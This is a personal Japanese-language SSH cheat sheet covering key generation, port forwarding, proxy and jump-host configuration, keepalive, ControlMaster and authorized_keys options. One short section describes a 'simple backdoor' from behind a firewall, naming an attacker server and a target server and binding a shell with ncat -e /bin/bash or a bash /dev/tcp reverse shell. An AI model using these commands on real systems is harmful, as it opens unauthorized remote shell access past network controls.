# ssh

## 鍵ペアをつくる
- RSA でビット長4096なやつ
```
ssh-keygen -t rsa -b 4096 {-C "email@example.com"} //コメントつけたければつける
```

## どんな鍵だったっけ
```
ssh-keygen -l -v -f ~/.ssh/id_rsa.pub
```
- -v つけるとフィンガープリントが出る．

## known_hosts って
- 何が書かれてるんだ？
  - sha2 とかrsaとしてのハッシュ値が保存されていて，ホストの信頼性を保証しようとしている．
  - `UpdateHostKeys ask` とかを活用するといいかんじにkey rotationできる．

## sshuttle
- べんり
- `sshuttle -r <username>@<host> <forwarding_ip_range>`

## port forward
```
$ ssh -L <localport>:<forwarded_host>:<forwarded_port> <username>@<dst_host>
```
- `-L`でその先にいけたり`-R`でバックドア的なの作れたり．autossh便利
- FW/NAT配下からの簡易バックドア
  - `ssh -R 10022:localhost:22 user@x.x.x.x`
  - これでx.x.x.xの10022にsshするとssh元のhostに入れる．
  - sshとかではなくshellそのままbind
    - attacker server
      - `nc -l -p 9999` // local onlyでよいので，なにかlinstenする
    - target server
      - `ssh -L 9999:localhost:9999 <attacker_server>` // sshでつないで，target serverの9999とattacker serverの9999をbindする
      - `ncat -nv 127.0.0.1 9999 -e /bin/bash` // localの9999とshellプロセスをbindする
        - `bash -c 'bash -i >& /dev/tcp/localhost/9999 0>&1'` でもよい
- [GitHub - jnovack/autossh: Heavily customizable AutoSSH Docker container](https://github.com/jnovack/autossh)
- [SSHポートフォワード（トンネリング）を使って、遠隔地からLAN内のコンピュータにログインする - 2014-09-12 - ククログ](https://www.clear-code.com/blog/2014/9/12.html)
- [楽しいトンネルの掘り方(オプション: -L, -R, -f, -N -g) — 京大マイコンクラブ (KMC)](https://www.kmc.gr.jp/advent-calendar/ssh/2013/12/09/tunnel2.html)
- [SSHクライアントのproxy越えの設定方法](https://www.bigbang.mydns.jp/sshproxy-x.htm)
- [踏み台経由のSSH接続する場合に便利な設定 - Fact of Life](http://www.fact-of-life.com/entry/2016/08/05/103951)

## sshconfig
```
## port forwarding
Host NAME
    HostName Address1
    User User1
    LocalForward PortA Address2:PortB

## proxy する
Host server
   HostName server.co.jp
   User hoge
Host proxy_target
   HostName target.co.jp
   User hoge
   ProxyCommand ssh -W %h:%p server
```

## Proxy経由でのssh
```
# http(nc)
ssh -o ProxyCommand='nc -X connect -x proxy.example.jp:8888 %h %p' user@example.jp

# http(ncat)
ssh -o ProxyCommand='ncat --proxy-type http --proxy proxy.example.jp:8888 %h %p' user@example.jp

# socks5
ssh -o ProxyCommand='nc -X 5 -x proxy.example.jp:8888 %h %p' user@example.jp
```
- ref
  - [sshをproxy経由でつなぐ - @znz blog](https://blog.n-z.jp/blog/2018-08-12-ssh-over-proxy.html)
  - [Mac OSXでHTTP Proxy経由でSSH #Mac - Qiita](https://qiita.com/yuyhiraka/items/30766c69fb605fc5f182)
  - [macOS Catalina から Proxy 経由で SSH 接続する #SSH - Qiita](https://qiita.com/fala/items/e4200ff707f83313e4a1)

## agent transfer
- [多段sshを行うときに、ローカルの秘密鍵を参照し続ける - Qiita](https://qiita.com/ymd_/items/5eb833ad757bd8b3e6c3)
- [ssh-agentの使い方 - Qiita](https://qiita.com/isaoshimizu/items/84ac5a0b1d42b9d355cf)
- sshに`-A`オプションをつけるのが一番手っ取り早い．
- `ForwardAgent yes` を`/etc/ssh/sshd_config` or `~/.ssh/config` とかに書く．

## ワイルドカードを使う
```
host gateway
  HostName sshgate.hoge
  User hoge

Host RemoteHost*
  HostName RemoteHost
  User fuga

host *-none
  ProxyCommand none

Host *-out*
  ProxyCommand ssh -W %h:%p gateway
```

## permission
- `~/.ssh` は`700`
- `~/.ssh/authorized_keys` は`644`

## sshrc
- `brew install sshrc`
- `~/.sshrc` に記述したコマンドをssh直後に自動で実行する．
```
$ mkdir ~/.sshrc.d
$ cd ~/.sshrc.d && ln -s ../.vimrc .vimrc/
$ cat << 'EOF' >> ~/.sshrci
export VIMINIT="let \$MYVIMRC='$SSHHOME/.sshrc.d/.vimrc' | source \$MYVIMRC"
EOF
$ cat ~/.sshrc
export VIMINIT="let \$MYVIMRC='$SSHHOME/.sshrc.d/.vimrc' | source \$MYVIMRC"
```

## ssh 先にvimrcとかbashrcをもっていく
- [sshした先に.bashrcや.vimrcを持って行きたい人のためのsshrc - Qiita](https://qiita.com/ikuwow/items/ba4ca57fd67c06fd1b19)

## ssh broken pipe
- [How to prevent "Write Failed: broken pipe" on SSH connection? - Ask Ubuntu](https://askubuntu.com/questions/127369/how-to-prevent-write-failed-broken-pipe-on-ssh-connection)
```
Earlier I was able to ssh to my droplet using ssh root@xxx.xx.xx.xxx command. But from yesterday I am getting this error packet_write_wait: Connection to xxx.xx.xx.xxx port 22: Broken pipe. What could be the possible reason for it. And how to solve it?
kamaln7 MOD February 14, 2018
Hi, if you're getting that error it means that your SSH connection was cut off due to a long period of inactivity. You can prevent that from happening by configuring either the SSH server or client to check if the other is still connected periodically.
To do so on the server, add the following two lines to /etc/ssh/sshd_config:
```
```
ClientAliveInterval 300
ClientAliveCountMax 2
```
On the client side, if you are using the ssh command line program, add the following lines to `~/.ssh/config`. This will enable this feature for all remote hosts.
```
Host *
    ServerAliveInterval 300
    ServerAliveCountMax 2
```
Otherwise, if you're using a GUI program, it should have a setting for Keep Alive.
This will send a ping every 300 seconds (5 minutes) and disconnect after 2 failures (in case the other side actually disconnected and isn't simply inactive).

## sshしてログイン時にプロンプト帰ってくるのが遅い．
- `/etc/ssh/sshd_config` で `UseDNS no`する．これで逆引きしに行かなくなる．

## known_hostsにのってるfingerprintと違うと言われるとき
```
ubuntu@lab1:~$ ssh admin@10.10.10.1
@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@
@    WARNING: REMOTE HOST IDENTIFICATION HAS CHANGED!     @
@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@
IT IS POSSIBLE THAT SOMEONE IS DOING SOMETHING NASTY!
Someone could be eavesdropping on you right now (man-in-the-middle attack)!
It is also possible that a host key has just been changed.
The fingerprint for the RSA key sent by the remote host is
SHA256:+7mcUfxxx2BTLzW/9ky0locxxxI2xwyWNJuAacNJxxx.
Please contact your system administrator.
Add correct host key in /home/ubuntu/.ssh/known_hosts to get rid of this message.
Offending RSA key in /home/ubuntu/.ssh/known_hosts:3
  remove with:
  ssh-keygen -f "/home/ubuntu/.ssh/known_hosts" -R 10.10.10.1
RSA host key for 10.10.10.1 has changed and you have requested strict checking.
Host key verification failed.

ubuntu@lab1:~$ ssh-keygen -f "/home/ubuntu/.ssh/known_hosts" -R 10.10.10.1
# Host 10.10.10.1 found: line 3
/home/ubuntu/.ssh/known_hosts updated.
Original contents retained as /home/ubuntu/.ssh/known_hosts.old

ubuntu@lab1:~$ ssh admin@10.10.10.1
```

## sshの known_hostsから消す
- `ssh-keygen -f "/home/jp7fkf/.ssh/known_hosts" -R "10.255.255.1`

## その他のssh config
```
# IdentityFile で指定した秘密鍵でのみ認証を試みる
IdentitiesOnly yes

# 圧縮転送．
Compression yes

# keepalive
ServerAliveInterval 15
# max回失敗で切断
ServerAliveCountMax 3

# フォワーディング失敗時にExitする
# ExitOnForwardFailure yes

# 接続試行回数
ConnectionAttempts 3
```

## GCPにOS_Login用の鍵を登録する
- 登録
  - `gcloud compute os-login ssh-keys add --key-file=/home/user/.ssh/id_rsa.pub`
  - `gcloud compute os-login ssh-keys add --key=<raw_key_string>`
- リスト表示
  - `gcloud compute os-login ssh-keys list --format=yaml`
- [gcloud compute os-login ssh-keys add  |  Cloud SDK Documentation](https://cloud.google.com/sdk/gcloud/reference/compute/os-login/ssh-keys/add)

## sshの-Jオプションが便利
- BSD sshのmanualより抜粋
```
     -J destination
             Connect to the target host by first making a ssh connection to the jump host
             described by destination and then establishing a TCP forwarding to the ultimate
             destination from there.  Multiple jump hops may be specified separated by comma
             characters.  This is a shortcut to specify a ProxyJump configuration directive.
             Note that configuration directives supplied on the command-line generally apply to
             the destination host and not any specified jump hosts.  Use ~/.ssh/config to spec-
             ify configuration for jump hosts.
```

## ControlMaster
```
Host *
  ControlMaster auto
  ControlPath   /tmp/%r@%h:%p
  # ControlPersist 600
  # ControlPersist 5m
```
- sshセッションへのunix domain socketが生える．パーミッションはdefalt 0600(ControlPersistで変更可能)．
- rootユーザなどはこのソケットが見えてしまうし，扱えるので利用上は留意する必要がある．
- [入門OpenSSH | 新山 祐介 |本 | 通販 | Amazon](http://amazon.co.jp/dp/479801348X)
- TODO: itermでsshしているときにどのsessionがmasterなのかわかるようにしたい．titleにだすとかで．

## `authorized_keys` に接続後実行するコマンドがかける
- 接続後lsする
```
# ~/.ssh/authorized_keys
command="ls" ssh-rsa AAA...xxx
```
- これ以外にもoptionがある．
  - [Detailed Description of How to Configure Authorized Keys for OpenSSH](https://www.ssh.com/academy/ssh/authorized-keys-openssh)
  - 活用できそうなのは `command`, `environment` くらいか．
